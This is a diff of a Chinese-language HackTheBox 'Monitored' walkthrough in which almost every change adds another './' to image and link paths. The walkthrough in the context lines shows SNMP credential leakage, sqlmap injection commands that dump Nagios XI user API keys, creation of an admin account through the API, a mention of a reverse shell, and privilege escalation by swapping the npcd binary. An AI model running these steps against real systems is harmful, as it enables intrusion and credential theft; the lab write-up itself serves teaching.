@@ -50,7 +50,7 @@ snmpwalk -v 2c -c public monitored.htb
 
 知道SVC用户的密码
 
-![image-20250321222237475](./././././././././Monitored/image-20250321222237475.png)
+![image-20250321222237475](././././././././././Monitored/image-20250321222237475.png)
 
 ```
 svc:XjH7VCehowpR1xZB
@@ -60,21 +60,21 @@ svc:XjH7VCehowpR1xZB
 
 https://nagios.monitored.htb/nagiosxi/ 也是个登录页面，使用上面的账号密码登录失败，显示账号被封禁
 
-![image-20250322165030753](./././././././././Monitored/image-20250322165030753.png)
+![image-20250322165030753](././././././././././Monitored/image-20250322165030753.png)
 
 
 
-查找[说明文档](././././././././././https://assets.nagios.com/downloads/nagiosxi/docs/Automated_Host_Management.pdf)找到/api/v1的接口，使用feroxbuster扫到不同的接口
+查找[说明文档](./././././././././././https://assets.nagios.com/downloads/nagiosxi/docs/Automated_Host_Management.pdf)找到/api/v1的接口，使用feroxbuster扫到不同的接口
 
 ```
 feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1  -k -m GET POST
 ```
 
-![image-20250322173600936](././././././././././Monitored/image-20250322173600936.png)
+![image-20250322173600936](./././././././././././Monitored/image-20250322173600936.png)
 
 使用svc登录该接口可以得到svc用户的token
 
-![image-20250322164832633](././././././././././Monitored/image-20250322164832633.png)
+![image-20250322164832633](./././././././././././Monitored/image-20250322164832633.png)
 
 https://nagios.monitored.htb/nagiosxi/index.php?token=e468b08798ef73bc83d5fdd33aa3508fe4a72de8
 
@@ -82,13 +82,13 @@ https://nagios.monitored.htb/nagiosxi/index.php?token=e468b08798ef73bc83d5fdd33a
 
 左下角有版本号
 
-![image-20250322183218894](././././././././././Monitored/image-20250322183218894.png)
+![image-20250322183218894](./././././././././././Monitored/image-20250322183218894.png)
 
 查找漏洞，发现sql注入
 
-![image-20250322185828387](././././././././././Monitored/image-20250322185828387.png)
+![image-20250322185828387](./././././././././././Monitored/image-20250322185828387.png)
 
-![image-20250322185757396](././././././././././Monitored/image-20250322185757396.png)
+![image-20250322185757396](./././././././././././Monitored/image-20250322185757396.png)
 
 sql语句报错了，说明存在sql注入
 
@@ -98,19 +98,19 @@ sql语句报错了，说明存在sql注入
 sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="action=acknowledge_banner_message&id=3" --cookie="nagiosxi=qf82es0u6nb5luhls0kq3rqvub" --batch -p id -t 20 --dbs
 ```
 
-![image-20250322203631690](././././././././././Monitored/image-20250322203631690.png)
+![image-20250322203631690](./././././././././././Monitored/image-20250322203631690.png)
 
 ```
  sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="action=acknowledge_banner_message&id=3" --cookie="nagiosxi=qf82es0u6nb5luhls0kq3rqvub" --batch -p id -t 20 -D nagiosxi --tables
 ```
 
-![image-20250322203812186](././././././././././Monitored/image-20250322203812186.png)
+![image-20250322203812186](./././././././././././Monitored/image-20250322203812186.png)
 
 ```
 sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="action=acknowledge_banner_message&id=3" --cookie="nagiosxi=qf82es0u6nb5luhls0kq3rqvub" --batch -p id -t 20 -D nagiosxi -T xi_users -C name,password,username,api_key --dump
 ```
 
-![image-20250322204150962](././././././././././Monitored/image-20250322204150962.png)
+![image-20250322204150962](./././././././././././Monitored/image-20250322204150962.png)
 
 ```
 name: Nagios Administrator 
@@ -130,9 +130,9 @@ api_key:2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK
 
 在上述的说明文档中有/api/v1/system/status参数正好是api_key
 
-![image-20250322205537261](././././././././././Monitored/image-20250322205537261.png)替换为管理员的api_key
+![image-20250322205537261](./././././././././././Monitored/image-20250322205537261.png)替换为管理员的api_key
 
-![image-20250322205829702](././././././././././Monitored/image-20250322205829702.png)
+![image-20250322205829702](./././././././././././Monitored/image-20250322205829702.png)
 
 没有什么有用的信息，扫一下/api/v1/ 下的其他api和api_key拼接后的目录
 
@@ -144,11 +144,11 @@ api_key:2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK
 feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1  -k --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --threads 60
 ```
 
-![image-20250322211336595](././././././././././Monitored/image-20250322211336595.png)
+![image-20250322211336595](./././././././././././Monitored/image-20250322211336595.png)
 
 访问https://nagios.monitored.htb/nagiosxi/api/v1/system?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL时返回未知的api终点
 
-![image-20250322213044217](././././././././././Monitored/image-20250322213044217.png)
+![image-20250322213044217](./././././././././././Monitored/image-20250322213044217.png)
 
 对扫出来的目录在进行递归扫描，即扫描/api/v1/system的子目录
 
@@ -156,25 +156,25 @@ feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1  -k --query apikey=I
  feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1/system  -k --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --threads 60 --depth 3
 ```
 
-![image-20250322223616992](././././././././././Monitored/image-20250322223616992.png)
+![image-20250322223616992](./././././././././././Monitored/image-20250322223616992.png)
 
 #### /api/v1/system/info
 
-![image-20250322213837011](././././././././././Monitored/image-20250322213837011.png)
+![image-20250322213837011](./././././././././././Monitored/image-20250322213837011.png)
 
 #### /api/v1/system/status
 
-![image-20250322213910942](././././././././././Monitored/image-20250322213910942.png)
+![image-20250322213910942](./././././././././././Monitored/image-20250322213910942.png)
 
 #### /api/v1/system/user
 
 如果是以GET方法访问则会显示用户信息
 
-![image-20250322223822846](././././././././././Monitored/image-20250322223822846.png)
+![image-20250322223822846](./././././././././././Monitored/image-20250322223822846.png)
 
 如果是以POST方法来访问，则会报创建用户失败的错误
 
-![image-20250322223925549](././././././././././Monitored/image-20250322223925549.png)
+![image-20250322223925549](./././././././././././Monitored/image-20250322223925549.png)
 
 ### config
 
@@ -186,7 +186,7 @@ feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1  -k --query apikey=I
 feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1/config  -k --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --threads 60
 ```
 
-![image-20250322213621703](././././././././././Monitored/image-20250322213621703.png)
+![image-20250322213621703](./././././././././././Monitored/image-20250322213621703.png)
 
 #### /api/v1/config/service
 
@@ -306,11 +306,11 @@ register	"1"
 
 #### /api/v1/config/contact
 
-![image-20250322214015668](././././././././././Monitored/image-20250322214015668.png)
+![image-20250322214015668](./././././././././././Monitored/image-20250322214015668.png)
 
 ### user
 
-![image-20250322221513788](././././././././././Monitored/image-20250322221513788.png)
+![image-20250322221513788](./././././././././././Monitored/image-20250322221513788.png)
 
 ### object
 
@@ -380,49 +380,49 @@ is_active	"1"
 
 /api/v1/system/user以POST方法提交时是创建用户
 
-![image-20250322223925549](././././././././././Monitored/image-20250322223925549.png)
+![image-20250322223925549](./././././././././././Monitored/image-20250322223925549.png)
 
 post提交username,password,email,name时可以成功创建用户,但是该用户的权限为普通用户并不是管理员
 
-![image-20250322224850486](././././././././././Monitored/image-20250322224850486.png)
+![image-20250322224850486](./././././././././././Monitored/image-20250322224850486.png)
 
 https://www.exploit-db.com/exploits/44560
 
 在这个漏洞中找到创建管理员的具体参数
 
-![image-20250322230947124](././././././././././Monitored/image-20250322230947124.png)
+![image-20250322230947124](./././././././././././Monitored/image-20250322230947124.png)
 
-![image-20250322231226159](././././././././././Monitored/image-20250322231226159.png)
+![image-20250322231226159](./././././././././././Monitored/image-20250322231226159.png)
 
 登陆之后菜单栏有admin菜单，说明当前是管理员用户
 
-![image-20250322231348700](././././././././././Monitored/image-20250322231348700.png)
+![image-20250322231348700](./././././././././././Monitored/image-20250322231348700.png)
 
 在`configure->core config manager`可以查看命令和添加命令
 
-![image-20250322234839397](././././././././././Monitored/image-20250322234839397.png)
+![image-20250322234839397](./././././././././././Monitored/image-20250322234839397.png)
 
 添加反弹shell的命令
 
 在用户界面下检查命令并且运行
 
-![image-20250322234954453](././././././././././Monitored/image-20250322234954453.png)
+![image-20250322234954453](./././././././././././Monitored/image-20250322234954453.png)
 
 即可成功得到shell
 
-![image-20250322235012563](././././././././././Monitored/image-20250322235012563.png)
+![image-20250322235012563](./././././././././././Monitored/image-20250322235012563.png)
 
 # 提权
 
 sudo -l
 
-![image-20250323000222915](././././././././././Monitored/image-20250323000222915.png)
+![image-20250323000222915](./././././././././././Monitored/image-20250323000222915.png)
 
 nagios和npcd都可以重启，尝试替换为提权shell然后重启
 
 查找npcd的位置
 
-![image-20250323000725440](././././././././././Monitored/image-20250323000725440.png)
+![image-20250323000725440](./././././././././././Monitored/image-20250323000725440.png)
 
 查看npcd是乱码，无法直接修改，再写一个npcd传上去
 
@@ -437,5 +437,5 @@ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
 sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
 ```
 
-![image-20250323001846625](././././././././././Monitored/image-20250323001846625.png)
+![image-20250323001846625](./././././././././././Monitored/image-20250323001846625.png)
 
